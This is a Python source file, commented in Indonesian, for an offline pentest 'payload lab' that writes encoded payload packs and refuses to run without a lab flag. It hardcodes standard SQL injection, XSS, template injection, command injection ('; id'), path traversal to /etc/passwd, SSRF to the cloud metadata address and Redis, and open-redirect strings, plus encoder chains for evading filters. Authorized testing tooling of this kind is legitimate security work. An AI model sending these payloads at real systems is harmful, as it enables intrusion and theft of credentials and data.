"""[SAFETY: lab-only] Payload lab — generator payload pentest + encoder chain.

F14 — untuk pengujian berotorisasi di LAB. Generator offline (tanpa
konektivitas): paket payload per kelas kerentanan umum + rantai encoder
(URL, double-URL, base64, hex, unicode, HTML entity) dengan SEED
deterministik (reproducible). Keluaran: paket JSON siap dipakai skill
attack atau dicek manual di lab.

Fail-closed: butuh --lab (payload bukan untuk dijalankan ke target tanpa
otorisasi; skill ini hanya MENYUSUN, tidak mengirim apa pun).

Pemakaian:
  python skills/payload_lab.py --classes sqli,xss,ssti,traversal,cmd,ssrf \
      --out payloads.json [--encode base64,url] [--lab]
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import sys
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "core"))
from findings import make_finding, write_findings  # noqa: E402

# Payload generik standar industri (mirip PayloadsAllTheThings) — dipakai
# untuk verifikasi kerentanan di LAB berotorisasi.
PAYLOADS = {
    "sqli": ["' OR '1'='1", "' OR '1'='1' --", "1' ORDER BY 1--",
             "1 UNION SELECT NULL,version()--", "1'; WAITFOR DELAY '0:0:5'--",
             "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "\"><svg onload=alert(1)>", "javascript:alert(1)",
            "'-alert(1)-'", "</textarea><script>alert(1)</script>"],
    "ssti": ["${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}", "${{7*'7'}}"],
    "cmd": ["; id", "| id", "`id`", "$(id)", "& dir", "\n/bin/id"],
    "traversal": ["../../etc/passwd", "..\\..\\..\\windows\\win.ini",
                  "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc/passwd"],
    "ssrf": ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/",
             "http://[::1]/", "gopher://127.0.0.1:6379/_INFO"],
    "openredirect": ["//evil.example", "https://evil.example",
                     "//evil.example@trusted.example"],
}

ENCODERS = {
    "url": lambda s: urllib.parse.quote(s, safe=""),
    "double-url": lambda s: urllib.parse.quote(
        urllib.parse.quote(s, safe=""), safe=""),
    "base64": lambda s: base64.b64encode(s.encode()).decode(),
    "hex": lambda s: s.encode().hex(),
    "unicode": lambda s: "".join(f"\\u{ord(c):04x}" for c in s),
    "html-entity": lambda s: "".join(f"&#{ord(c)};" for c in s),
}


def encode_chain(s: str, chain: list[str]) -> str:
    for enc in chain:
        s = ENCODERS[enc](s)
    return s


def build_pack(classes: list[str], chains: list[str], seed: str) -> dict:
    pack: dict = {}
    for cls in classes:
        items = []
        for p in PAYLOADS.get(cls, []):
            entry = {"raw": p,
                     "id": hashlib.sha256(
                         f"{seed}|{cls}|{p}".encode()).hexdigest()[:16]}
            for chain in chains:
                encs = [e.strip() for e in chain.split("+")]
                entry["+".join(encs)] = encode_chain(p, encs)
            items.append(entry)
        pack[cls] = items
    return pack


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--classes", default="sqli,xss,ssti,traversal,cmd,ssrf")
    ap.add_argument("--encode", default="url,base64",
                    help="rantai encoder dipisah koma; '+' menggabungkan "
                         "(contoh: base64+url)")
    ap.add_argument("--seed", default="lab-1")
    ap.add_argument("--out", default="payload-pack.json")
    ap.add_argument("--lab", action="store_true")
    args = ap.parse_args()

    import os
    if not args.lab and os.environ.get("LAB") != "1":
        print("DITOLAK: payload generator butuh --lab / LAB=1 (fail-closed — "
              "pakai hanya di lab berotorisasi)", file=sys.stderr)
        return 3

    classes = [c.strip() for c in args.classes.split(",") if c.strip()]
    chains = [c.strip() for c in args.encode.split(",") if c.strip()]
    pack = build_pack(classes, chains, args.seed)
    total = sum(len(v) for v in pack.values())

    Path(args.out).write_text(json.dumps({
        "ok": True, "seed": args.seed, "classes": pack, "chains": chains,
    }, indent=2, ensure_ascii=False), encoding="utf-8")

    rows = [make_finding(
        tool="payload-lab",
        title=f"Payload pack built: {total} payloads, "
              f"{len(classes)} classes, chains={chains}",
        severity="info",
        description="Paket payload generik tersusun OFFLINE (nol trafik). "
                    "Dipakai di lab berotorisasi; setiap payload ber-ID "
                    "deterministik (seeded) sehingga verifikasi "
                    "reproducible.",
        target_url=None, evidence_kind="arithmetic",
        finding_class="posture", confidence=1.0, status="confirmed",
        verdict=0, extra={"category": "LAB", "safety_class": "lab-only",
                          "seed": args.seed})]
    write_findings(str(Path(args.out).with_suffix(".findings.json")),
                   rows, {"run": "payload-lab", "requests": 0,
                          "safety_class": "lab-only"})
    print(f"payload-lab: {total} payload ({len(classes)} kelas) -> {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
